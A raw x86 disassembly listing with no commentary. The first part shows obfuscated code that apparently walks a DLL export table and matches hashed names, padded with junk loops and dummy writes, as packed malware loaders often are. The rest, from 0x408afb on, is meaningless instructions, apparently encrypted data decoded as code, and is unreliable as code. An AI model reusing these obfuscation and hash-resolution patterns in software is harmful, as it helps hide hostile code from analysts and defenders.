  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x8fef29ff,eax
  408b09:	sub    BYTE PTR [edi-0x16],dl
  408b0c:	in     eax,0x7b
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	or     eax,0x28c48978
  408b18:	shl    BYTE PTR ds:0x1bca6c4b,0x58
  408b1f:	pop    ebx
  408b20:	jge    0x408abc
  408b22:	int    0x46
  408b24:	popf   
  408b25:	rcr    BYTE PTR [ebp-0x2c],cl
  408b28:	jns    0x408b59
  408b2a:	(bad)  
  408b2c:	jno    0x408b9c
  408b2e:	call   0xe15e3025
  408b33:	inc    edx
  408b34:	rol    DWORD PTR [ebx-0x71],0x92
  408b38:	mov    DWORD PTR [ebp-0xcdce75],ebx
  408b3e:	jns    0x408bb4
  408b40:	sbb    dh,BYTE PTR [edi]
  408b42:	cmp    BYTE PTR [eax],ah
  408b44:	jmp    0x1e5a6042
  408b49:	iret   
  408b4a:	push   esi
  408b4b:	(bad)  
  408b4c:	int3   
  408b4d:	loopne 0x408ae6
  408b4f:	repnz cmp eax,0x3edf42bd
  408b55:	pop    edx
  408b56:	shr    DWORD PTR [esi+0x5d89af14],cl
  408b5c:	or     DWORD PTR [ebp+edi*1+0x4b8a6b99],0x6e97122b
  408b67:	mov    cl,0x44
  408b69:	aaa    
  408b6a:	in     eax,0x6
  408b6c:	sbb    eax,esi
  408b6e:	jae    0x408bca
  408b70:	fldl2e 
  408b72:	call   0x3cea:0x29ce7b7a
  408b79:	push   ecx
  408b7a:	dec    edx
  408b7b:	mov    WORD PTR [esi+0x76],ss
  408b7e:	test   BYTE PTR [ebx+edx*1+0x61],bl
  408b82:	cmp    esi,DWORD PTR [ebx-0x1981bbed]
  408b88:	out    0x8a,eax
  408b8a:	add    BYTE PTR [ebx+0x36],dl
  408b8d:	sbb    al,0xe1
  408b8f:	fdivp  st(2),st
  408b91:	lea    ecx,[ecx+ebx*2-0x62]
  408b95:	mov    ah,0x74
  408b97:	mov    al,ah
  408b99:	rcl    ch,0x9c
  408b9c:	test   ecx,esp
  408b9e:	push   edi
  408b9f:	pop    edx
  408ba0:	aaa    
  408ba1:	cmp    DWORD PTR [ebp+0x25],esi
  408ba4:	cmp    al,0x42
  408ba6:	pop    ebp
  408ba7:	ficomp DWORD PTR [ebp-0x280d456e]
  408bad:	ja     0x408b8e
  408baf:	adc    al,0xbb
  408bb1:	icebp  
  408bb2:	xor    al,0x72
  408bb4:	xlat   BYTE PTR ds:[ebx]
  408bb5:	jae    0x408bf4
  408bb7:	outs   dx,BYTE PTR ds:[esi]
  408bb8:	repz mov cl,0x98
  408bbb:	sbb    eax,0x444fe7dd
  408bc0:	mov    cl,0xe0
  408bc2:	cwde   
  408bc3:	outs   dx,BYTE PTR ds:[esi]
  408bc4:	aas    
  408bc5:	js     0x408bd0
  408bc7:	pop    ecx
  408bc8:	loopne 0x408ba7
  408bca:	jbe    0x408c17
  408bcc:	test   al,0x98
  408bce:	pop    esp
  408bcf:	jecxz  0x408bdd
  408bd1:	les    eax,FWORD PTR [ebx-0x6ea88411]
  408bd7:	mov    dl,bh
  408bd9:	fwait
  408bda:	clc    
  408bdb:	mov    eax,0x5a5292cd
  408be0:	xchg   edi,eax
  408be1:	add    eax,0x1e846757
  408be6:	in     eax,dx
  408be7:	test   BYTE PTR [ebx],bh
  408be9:	and    eax,0xfb35e7cf
  408bee:	fyl2x  
  408bf0:	add    dh,BYTE PTR [ebx-0x4b9588f0]
  408bf6:	sbb    dh,BYTE PTR [edx+0x762a8821]
  408bfc:	test   BYTE PTR [eax],0xf9
  408bff:	push   esi
  408c00:	popa   
  408c01:	xlat   BYTE PTR ds:[ebx]
  408c02:	rol    DWORD PTR [esi+0x2073721f],1
  408c08:	mov    ebx,0xc227778e
  408c0d:	sub    eax,0xa2b1e309
  408c12:	aas    
  408c13:	fsubp  st(4),st
  408c15:	cdq    
  408c16:	fsubr  st(6),st
  408c18:	xchg   ebx,eax
  408c19:	pop    eax
  408c1a:	cmp    al,0x48
  408c1c:	mov    ebx,0xdefb5a0b
  408c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c22:	add    al,0xf3
  408c24:	js     0x408c32
  408c26:	adc    eax,0x8666c0d9
  408c2b:	aam    0x34
  408c2d:	jae    0x408c86
  408c2f:	retf   0x2109
  408c32:	shl    BYTE PTR [ebp+0x42dd0321],0x3e
  408c39:	outs   dx,BYTE PTR ds:[esi]
  408c3a:	push   eax
  408c3b:	inc    ebp
  408c3c:	popf   
  408c3d:	popf   
  408c3e:	aam    0x14
  408c40:	outs   dx,BYTE PTR ds:[esi]
  408c41:	mov    al,ds:0x35c6f9fc
  408c46:	popf   
  408c47:	xchg   esi,eax
  408c48:	ret    
  408c49:	or     BYTE PTR [ebx-0x1d],cl
  408c4c:	pop    ecx
  408c4d:	(bad)  
  408c4e:	es stc 
  408c50:	and    ch,dh
  408c52:	sub    dl,BYTE PTR [eax-0x3830c2e9]
  408c58:	and    al,0xa8
  408c5a:	and    dl,dh
  408c5c:	or     esi,DWORD PTR ds:0x869d7016
  408c62:	xor    al,0x19
  408c64:	push   edi
  408c65:	jnp    0x408c2e
  408c67:	or     ah,BYTE PTR [ecx]
  408c69:	inc    ebp
  408c6a:	and    DWORD PTR [ebx-0x4df8a997],edi
  408c70:	mov    DWORD PTR [ebx+0x8],ebx
  408c73:	jmp    0x4acf7c4c
  408c78:	jne    0x408c2a
  408c7a:	xor    BYTE PTR [eax-0x5b],ch
  408c7d:	loopne 0x408c81
  408c7f:	test   ecx,0x9256adad
  408c85:	lahf   
  408c86:	fld    st(1)
  408c88:	fmul   st,st(3)
  408c8a:	adc    DWORD PTR [ecx+0x0],ebx
  408c8d:	ins    BYTE PTR es:[edi],dx
  408c8e:	loope  0x408c3f
  408c90:	lods   eax,DWORD PTR ds:[esi]
  408c91:	lods   eax,DWORD PTR ds:[esi]
  408c92:	mov    ebp,0x22d445c0
  408c97:	enter  0xcf86,0xae
  408c9b:	push   ecx
  408c9c:	sub    eax,0x32e106e
  408ca1:	lods   al,BYTE PTR ds:[esi]
  408ca2:	jg     0x408cc7
  408ca4:	mov    edx,0x656f1313
  408ca9:	ds adc eax,0x41003dfb
  408caf:	and    al,0xbe
  408cb1:	xchg   edi,eax
  408cb2:	jns    0x408c9f
  408cb4:	inc    ebp
  408cb5:	push   esi
  408cb6:	cmp    BYTE PTR [edx-0x4b26b11d],0xf8
  408cbd:	pushf  
  408cbe:	xchg   edx,eax
  408cbf:	call   0xfe1:0x9d54273
  408cc6:	push   edi
  408cc7:	jmp    FWORD PTR [esi+0x78d78ca9]
  408ccd:	sahf   
  408cce:	or     ah,BYTE PTR [ecx+0xf]
  408cd1:	pop    ebx
  408cd2:	xor    esi,DWORD PTR [edi-0x1c]
  408cd5:	adc    esp,DWORD PTR [esi]
  408cd7:	fist   DWORD PTR [edx+eiz*8+0x28]
  408cdb:	fidivr WORD PTR [eax-0x6e42a760]
  408ce1:	gs loop 0x408d23
  408ce4:	or     al,al
  408ce6:	les    esi,FWORD PTR [ecx+esi*8]
  408ce9:	jp     0x408cec
  408ceb:	loopne 0x408d68
  408ced:	dec    esp
  408cee:	ja     0x408c7d
  408cf0:	xor    esi,ecx
  408cf2:	cmp    ch,BYTE PTR [esi+ebp*1+0x4be540a4]
  408cf9:	xor    BYTE PTR [ecx-0x2895f2a4],cl
  408cff:	es out dx,al
  408d01:	das    
  408d02:	aam    0xd3
  408d04:	ss std 
  408d06:	jo     0x408cea
  408d08:	(bad)  
  408d09:	retf   
  408d0a:	adc    eax,0xbaf5852f
  408d0f:	in     eax,0xaf
  408d11:	push   ebp
  408d12:	and    al,0xb5
  408d14:	nop
  408d15:	add    ebp,DWORD PTR [eax+0x43]
  408d18:	jo     0x408d59
  408d1a:	mov    ebp,0xd11e991b
  408d1f:	lahf   
  408d20:	push   es
  408d21:	cs pushf 
  408d23:	mov    WORD PTR [eax],fs
  408d25:	inc    esi
  408d26:	les    ecx,FWORD PTR [eax]
  408d28:	dec    ebx
  408d29:	loopne 0x408cfd
  408d2b:	int3   
  408d2c:	jne    0x408d17
  408d2e:	(bad)  
  408d2f:	test   ebx,0x77e8c7d
  408d35:	pop    es
  408d36:	mov    ch,dl
  408d38:	shufps xmm7,xmm2,0xd5
  408d3c:	mov    BYTE PTR [ecx],dh
  408d3e:	mov    eax,0x9eafcdf2
  408d43:	cmp    bh,BYTE PTR [ecx]
  408d45:	and    DWORD PTR [ebp-0x6],esi
  408d48:	xlat   BYTE PTR ds:[ebx]
  408d49:	mov    ds:0x32d0eb2b,eax
  408d4e:	mov    al,0x5b
  408d50:	add    BYTE PTR [ecx+0x1571d48d],dl
  408d56:	xchg   DWORD PTR [ebx-0x7490bc38],ebx
  408d5c:	(bad)  
  408d5e:	int    0x11
  408d60:	pop    ss
  408d61:	stc    
  408d62:	jecxz  0x408d24
  408d64:	(bad)  
  408d65:	fs and eax,esp
  408d68:	jmp    0x408dda
  408d6a:	jmp    0xe72387fc
  408d6f:	xchg   dh,bh
  408d71:	mov    ds:0x17b7f97c,eax
  408d76:	mov    ah,0x4c
  408d78:	push   ecx
  408d79:	sar    DWORD PTR [ebx+0x8],0x86
  408d7d:	fimul  DWORD PTR [edx]
  408d7f:	aad    0xa8
  408d81:	jmp    0x54a9:0x505bb820
  408d88:	or     eax,0xa73a9809
  408d8d:	add    eax,ebp
  408d8f:	inc    ecx
  408d90:	mov    ch,0xca
  408d92:	lock iret 
  408d94:	cld    
  408d95:	cmp    al,0xf9
  408d97:	ror    DWORD PTR [ecx-0x5e146da0],cl
  408d9d:	adc    ecx,DWORD PTR [ebx-0x34c7151]
  408da3:	ror    BYTE PTR ds:0x835f69e2,1
  408da9:	aaa    
  408daa:	dec    eax
  408dab:	push   esi
  408dac:	shl    ch,cl
  408dae:	mov    bl,0x5
  408db0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408db2:	test   eax,0x6634d0a1
  408db7:	enter  0x75e3,0x93
  408dbb:	sti    
  408dbc:	sub    eax,0x391c0e27
  408dc1:	aam    0xd7
  408dc3:	inc    edx
  408dc4:	jecxz  0x408dd8
  408dc6:	aas    
  408dc7:	and    BYTE PTR [ecx],0x80
  408dca:	std    
  408dcb:	dec    edi
  408dcc:	sub    DWORD PTR [edx+0x18205859],0x4079983d
  408dd6:	imul   ecx,ecx,0x1b
  408dd9:	ja     0x408d8a
  408ddb:	dec    edx
  408ddc:	xor    ah,bl
  408dde:	inc    ecx
  408ddf:	mov    fs,WORD PTR [edx]
  408de1:	cmp    al,0x23
  408de3:	xchg   ecx,eax
  408de4:	js     0x408dab
  408de6:	or     DWORD PTR [esi+0x6d],edi
  408de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dea:	adc    eax,0x3b01b22a
  408def:	xchg   ebx,eax
  408df0:	xchg   ah,bl
  408df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408df3:	lds    ebx,FWORD PTR [ebx+0x8]
  408df6:	test   al,0x56
  408df8:	push   0xf
  408dfa:	int    0x8e
  408dfc:	clc    
  408dfd:	pop    ds
  408dfe:	sub    bh,BYTE PTR [ebx-0x5a]
  408e01:	scas   eax,DWORD PTR es:[edi]
  408e02:	pop    eax
  408e03:	pop    es
  408e04:	add    eax,0x21767135
  408e09:	xor    eax,0x2ff5e6f0
  408e0e:	in     al,dx
  408e0f:	nop
  408e10:	push   0xffffffd0
  408e12:	loopne 0x408e92
  408e14:	loopne 0x408da2
  408e16:	pop    edx
  408e17:	mov    esp,0xdfa50f4d
  408e1c:	imul   ebp,DWORD PTR [ebx],0xffffffbd
  408e1f:	adc    al,0x57
  408e21:	call   0x63a2:0xa4f8b3bc
  408e28:	into   
  408e29:	or     ebx,edi
  408e2b:	xchg   DWORD PTR [esi+0x69f49eb1],esi
  408e31:	mov    ah,0xbf
  408e33:	cmp    eax,0x326be6ec
  408e38:	jmp    0xbc0f688d
  408e3d:	je     0x408de7
  408e3f:	pop    ss
  408e40:	push   esp
  408e41:	dec    ebx
  408e42:	fcmovnb st,st(7)
  408e44:	add    ch,BYTE PTR [ebp-0x7]
  408e47:	sub    dl,BYTE PTR [ebx]
  408e49:	mov    DWORD PTR ds:0xe1e92f6e,esi
  408e4f:	ins    BYTE PTR es:[edi],dx
  408e50:	fimul  WORD PTR [eax-0x68]
  408e53:	add    DWORD PTR [edx-0x2fc36ad9],edx
  408e59:	stos   DWORD PTR es:[edi],eax
  408e5a:	cmp    DWORD PTR [ebx],ecx
  408e5c:	cmp    al,0xfb
  408e5e:	(bad)  
  408e5f:	push   0xffffffe6
  408e61:	int    0x85
  408e63:	dec    edx
  408e64:	ret    0xa486
  408e67:	das    
  408e68:	imul   esp,DWORD PTR [ebp-0x72],0x92467377
  408e6f:	xchg   dl,ah
  408e71:	push   0x74
  408e73:	leave  
  408e74:	cmp    edx,0xffffffe3
  408e77:	jle    0x408e33
  408e79:	push   ecx
  408e7a:	aas    
  408e7b:	push   edi
  408e7c:	mov    eax,0xf17e34e7
  408e81:	idiv   BYTE PTR [ecx-0x59f92c51]
  408e87:	leave  
  408e88:	push   ss
  408e89:	jae    0x408e1e
  408e8b:	stc    
  408e8c:	xchg   ebp,eax
  408e8d:	sbb    BYTE PTR [esi+esi*4],bh
  408e90:	cmp    BYTE PTR [edi-0x43ec1c00],dh
  408e96:	cmp    ah,BYTE PTR [eax-0x62e4f20a]
  408e9c:	js     0x408eb4
  408e9e:	icebp  
  408e9f:	push   edx
  408ea0:	mov    al,0x7c
  408ea2:	sub    BYTE PTR [esi-0x6b8b4fc1],cl
  408ea8:	add    al,0x83
  408eaa:	mov    eax,0x76656e6e
  408eaf:	popa   
  408eb0:	rol    edi,1
  408eb2:	out    dx,eax
  408eb3:	add    DWORD PTR [esi+0x5d],ebx
  408eb6:	or     bh,al
  408eb8:	ret    0xba27
  408ebb:	data16 in al,dx
  408ebd:	mov    edx,0x9d66d5c6
  408ec2:	or     al,bl
  408ec4:	cdq    
  408ec5:	pop    ecx
  408ec6:	add    BYTE PTR [edi+edi*2+0x315feaa],ah
  408ecd:	and    bh,BYTE PTR [ebp-0x564dc8b]
  408ed3:	sub    bl,BYTE PTR [eax]
  408ed5:	sti    
  408ed6:	cmc    
  408ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ed8:	repz fs dec esp
  408edb:	mov    ecx,0x28e5f615
  408ee0:	in     eax,0x5b
  408ee2:	leave  
  408ee3:	push   eax
  408ee4:	or     DWORD PTR [esp+esi*8],edi
  408ee7:	ja     0x408ed1
  408ee9:	sub    bh,BYTE PTR [esi+0x5f2653e7]
  408eef:	and    DWORD PTR [edi+0x14d24919],ecx
  408ef5:	das    
  408ef6:	dec    edx
  408ef7:	imul   eax,DWORD PTR [edi+0x6b409b31],0x6a
  408efe:	sub    dl,BYTE PTR [esi]
  408f00:	mov    BYTE PTR [ebx-0x3b502907],dh
  408f06:	and    edi,ebx
  408f08:	sub    cl,dh
  408f0a:	(bad)  
  408f0b:	cld    
  408f0c:	fsub   st(0),st
  408f0e:	iret   
  408f0f:	sbb    dl,0xe0
  408f12:	imul   eax,DWORD PTR [edi],0x663fa99f
  408f18:	in     al,dx
  408f19:	sbb    eax,0xbf006462
  408f1e:	lea    ecx,[esp+ecx*8-0x5]
  408f22:	call   FWORD PTR [eax-0x50]
  408f25:	add    bl,ch
  408f27:	inc    esi
  408f28:	mov    edx,0xdfcbc23f
  408f2d:	add    esi,edi
  408f2f:	mov    ds:0x451a93c3,al
  408f34:	pop    ebx
  408f35:	out    0x6d,al
  408f37:	(bad)  
  408f38:	pop    ebp
  408f39:	sar    DWORD PTR [edx+0x7dff9e69],1
  408f3f:	pop    ebx
  408f40:	or     al,0x66
  408f42:	shr    BYTE PTR [esi],0x7a
  408f45:	sub    al,0x28
  408f47:	lods   al,BYTE PTR ds:[esi]
  408f48:	mov    esi,0x7303a100
  408f4d:	or     edx,DWORD PTR [ecx]
  408f4f:	push   esi
  408f50:	inc    esi
  408f51:	push   ebp
  408f52:	imul   DWORD PTR [esp+edx*4-0x2e]
  408f56:	in     al,0xfc
  408f58:	mov    edi,DWORD PTR [esi+0x68]
  408f5b:	(bad)  
  408f5c:	jbe    0x408f3a
  408f5e:	je     0x408f08
  408f60:	repnz stos DWORD PTR es:[edi],eax
  408f62:	push   ecx
  408f63:	push   es
  408f64:	cdq    
  408f65:	mov    eax,ds:0x4a2a67f6
  408f6a:	sub    DWORD PTR [ecx],edx
  408f6c:	jno    0x408f5d
  408f6e:	and    BYTE PTR [ecx+ebx*1],bh
  408f71:	je     0x408fd2
  408f73:	pop    ds
  408f74:	gs popa 
  408f76:	push   esi
  408f77:	dec    eax
  408f78:	xchg   esp,eax
  408f79:	push   ecx
  408f7a:	popf   
  408f7b:	rcr    BYTE PTR [eax-0x67],0xc0
  408f7f:	shl    DWORD PTR [edi+0x6f],0x3b
  408f83:	add    DWORD PTR [ebx-0x44ca04e7],0x6e23d21c
  408f8d:	popa   
  408f8e:	jle    0x408fce
  408f90:	mov    ecx,0xb3cba6d5
  408f95:	out    0xc9,al
  408f97:	sub    DWORD PTR [edx],ebx
  408f99:	ret    
  408f9a:	lods   eax,DWORD PTR ds:[esi]
  408f9b:	mov    BYTE PTR [ecx],dh
  408f9d:	cs loope 0x408f32
  408fa0:	lea    ebp,[ecx-0x2026b29a]
  408fa6:	inc    ecx
  408fa7:	aaa    
  408fa8:	js     0x408fe8
  408faa:	rcl    BYTE PTR [edx],0x74
  408fad:	je     0x409021
  408faf:	imul   BYTE PTR [edx-0x51eeacc3]
  408fb5:	sbb    al,0x15
  408fb7:	xor    ebx,ebx
  408fb9:	stc    
  408fba:	shl    dh,1
  408fbc:	inc    edi
  408fbd:	fcomp  DWORD PTR [esi+0x4462188a]
  408fc3:	pop    ds
  408fc4:	push   ss
  408fc5:	sub    DWORD PTR [esi-0x39a96b5e],ebx
  408fcb:	imul   ebp,DWORD PTR [ebx+ecx*2+0x6ea72842],0xfffffffc
  408fd3:	sbb    eax,0x5e948eb9
  408fd8:	mov    bl,0x12
  408fda:	mov    WORD PTR [esi-0x3c],?
  408fdd:	fldenv [ecx]
  408fdf:	dec    edi
  408fe0:	or     BYTE PTR ds:0x77eec2c5,bl
  408fe6:	push   esp
  408fe7:	lock add ah,dl
  408fea:	pop    ebp
  408feb:	xchg   ebx,eax
  408fec:	or     eax,0x4eb95c75
  408ff1:	xor    bh,BYTE PTR [edi+0x2]
  408ff4:	icebp  
  408ff5:	scas   eax,DWORD PTR es:[edi]
  408ff6:	fild   QWORD PTR [ebx+edi*1]
  408ff9:	stos   DWORD PTR es:[edi],eax
  408ffa:	(bad)  
  408ffb:	mov    esp,0xf3817994
  409000:	xchg   ecx,eax
  409001:	out    0x5b,al
  409003:	ret    
  409004:	test   dl,0x28
  409007:	jbe    0x408fcf
  409009:	adc    dh,bh
  40900b:	ret    
  40900c:	iret   
  40900d:	jne    0x408ffd
  40900f:	jmp    0x40906a
  409011:	mov    ch,0x18
  409013:	sub    DWORD PTR [ecx],edx
  409015:	adc    bh,BYTE PTR [ebp+eiz*1+0x4d]
  409019:	cmp    BYTE PTR [bx-0x54a0],ah
  40901e:	mov    cl,0xed
  409020:	out    dx,eax
  409021:	cmp    al,BYTE PTR [ecx]
  409023:	(bad)
  409027:	pusha  
  409028:	outs   dx,BYTE PTR ds:[esi]
  409029:	xor    eax,0x5c95a661
  40902e:	ret    
  40902f:	loope  0x40907a
  409031:	or     BYTE PTR [ebp+0x7b],cl
  409034:	xchg   ecx,eax
  409035:	scas   eax,DWORD PTR es:[edi]
  409036:	clc    
  409037:	pop    edx
  409038:	(bad)  
  409039:	pop    ebx
  40903a:	jmp    0x6e53:0x97ff7634
  409041:	test   BYTE PTR [ebx],0xcd
  409044:	jmp    0xd144:0xe31f824a
  40904b:	fst    DWORD PTR [ebx-0x690c8d04]
  409051:	adc    bh,BYTE PTR [eax+0x22ac4fb]
  409057:	jnp    0x409089
  409059:	cmc    
  40905a:	add    eax,0x2c121c8a
  40905f:	xchg   edx,eax
  409060:	lea    ebx,[ecx-0xd]
  409063:	repnz push eax
  409065:	test   DWORD PTR [ebp-0x1a44f9e8],esp
  40906b:	and    DWORD PTR [eax],esp
  40906d:	fwait
  40906e:	mov    eax,0xd7b9c899
  409073:	clc    
  409074:	mov    ecx,0x21c9cd11
  409079:	or     BYTE PTR [esi],ch
  40907b:	mov    eax,0x87a795c7
  409080:	mov    dl,0x2e
  409082:	pop    ebp
  409083:	in     al,dx
  409084:	dec    edi
  409085:	jle    0x40901d
  409087:	jge    0x4090d0
  409089:	ins    BYTE PTR es:[edi],dx
  40908a:	push   cs
  40908b:	repnz outs dx,DWORD PTR ds:[esi]
  40908d:	int3   
  40908e:	push   ss
  40908f:	adc    dl,BYTE PTR [esp+edi*2-0x7]
  409093:	bound  ebx,QWORD PTR [edx+0x71815f18]
  409099:	in     al,0xab
  40909b:	dec    edx
  40909c:	or     WORD PTR [edx],si
  40909f:	jl     0x4090fd
  4090a1:	and    eax,0xe3949126
  4090a6:	cld    
  4090a7:	and    al,0xbe
  4090a9:	jecxz  0x4090c9
  4090ab:	fidiv  WORD PTR [edi-0xf]
  4090ae:	pop    ebx
  4090af:	xchg   esp,eax
  4090b0:	lahf   
  4090b1:	add    eax,0xebaa76e4
  4090b6:	pushf  
  4090b7:	dec    eax
  4090b8:	push   esp
  4090b9:	mov    al,ds:0x6d7872cf
  4090be:	bound  eax,QWORD PTR [ecx+0x1f]
  4090c1:	jns    0x409095
  4090c3:	pop    esi
  4090c4:	fsub   st,st(2)
  4090c6:	push   eax
  4090c7:	cmp    ebx,DWORD PTR [ebx-0x16]
  4090ca:	push   esp
  4090cb:	mov    ebx,0x7e694576
  4090d0:	icebp  
  4090d1:	xor    al,0xc0
  4090d3:	call   0x60fd6880
  4090d8:	and    DWORD PTR [eax-0x7fbfa8f7],esi
  4090de:	sbb    al,0x7
  4090e0:	sbb    al,0x3e
  4090e2:	dec    ebp
  4090e3:	sub    al,0xc0
  4090e5:	fimul  WORD PTR [esi+0x322e9998]
  4090eb:	fucomip st,st(5)
  4090ed:	add    al,0xd4
  4090ef:	sbb    al,0xa8
  4090f1:	mov    bl,0x3e
  4090f3:	int3   
  4090f4:	test   al,0x14
  4090f6:	or     esp,DWORD PTR [esi-0x773d53a0]
  4090fc:	popf   
  4090fd:	daa    
  4090fe:	sub    BYTE PTR [ecx+ecx*1-0x6e750b67],ah
  409105:	xor    cl,dl
  409107:	sar    DWORD PTR [edx],0x6a
  40910a:	pop    es
  40910b:	lahf   
  40910c:	inc    esi
  40910d:	mov    ebx,0xa9f3d87b
  409112:	add    esi,DWORD PTR [edi]
  409114:	xchg   ebx,eax
  409115:	push   ecx
  409116:	push   ss
  409117:	rol    ebp,cl
  409119:	mov    eax,cs
  40911b:	fcom   DWORD PTR [esi+0x34717d01]
  409121:	push   esp
  409122:	lea    ebp,[ecx+0x38208978]
  409128:	push   edi
  409129:	test   ebp,0x7a2654f6
  40912f:	add    eax,ecx
  409131:	jge    0x409194
  409133:	mov    esi,0x6452fd1a
  409138:	(bad)
